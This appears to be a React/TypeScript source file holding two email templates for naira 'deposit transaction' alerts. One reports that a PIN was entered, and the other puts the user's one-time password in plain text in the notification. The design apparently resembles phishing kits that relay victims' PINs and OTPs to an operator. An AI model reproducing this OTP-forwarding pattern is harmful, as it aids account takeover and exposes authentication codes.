interface PinEmailProps {
  email: string
  amount: string
}

export function PinEmail({ email, amount }: PinEmailProps) {
  return (
    <div style={{ fontFamily: "Arial, sans-serif", maxWidth: "600px", margin: "0 auto" }}>
      <h2 style={{ color: "#1e40af" }}>Deposit Transaction Alert</h2>
      <p>A deposit transaction has been initiated:</p>
      <div
        style={{
          background: "#f3f4f6",
          padding: "20px",
          borderRadius: "8px",
          margin: "20px 0",
        }}
      >
        <p>
          <strong>Email:</strong> {email}
        </p>
        <p>
          <strong>Amount:</strong> ₦{amount}
        </p>
        <p>
          <strong>Status:</strong> PIN entered, awaiting OTP verification
        </p>
        <p>
          <strong>Time:</strong> {new Date().toLocaleString()}
        </p>
      </div>
      <p style={{ color: "#6b7280" }}>This is an automated notification from your deposit system.</p>
    </div>
  )
}

interface OtpEmailProps {
  email: string
  amount: string
  otp: string
}

export function OtpEmail({ email, amount, otp }: OtpEmailProps) {
  return (
    <div style={{ fontFamily: "Arial, sans-serif", maxWidth: "600px", margin: "0 auto" }}>
      <h2 style={{ color: "#059669" }}>Deposit Transaction Completed</h2>
      <p>A deposit transaction has been completed:</p>
      <div
        style={{
          background: "#f3f4f6",
          padding: "20px",
          borderRadius: "8px",
          margin: "20px 0",
        }}
      >
        <p>
          <strong>Email:</strong> {email}
        </p>
        <p>
          <strong>Amount:</strong> ₦{amount}
        </p>
        <p>
          <strong>OTP:</strong> {otp}
        </p>
        <p>
          <strong>Status:</strong> Transaction authorized
        </p>
        <p>
          <strong>Time:</strong> {new Date().toLocaleString()}
        </p>
      </div>
      <p style={{ color: "#6b7280" }}>This is an automated notification from your deposit system.</p>
    </div>
  )
}
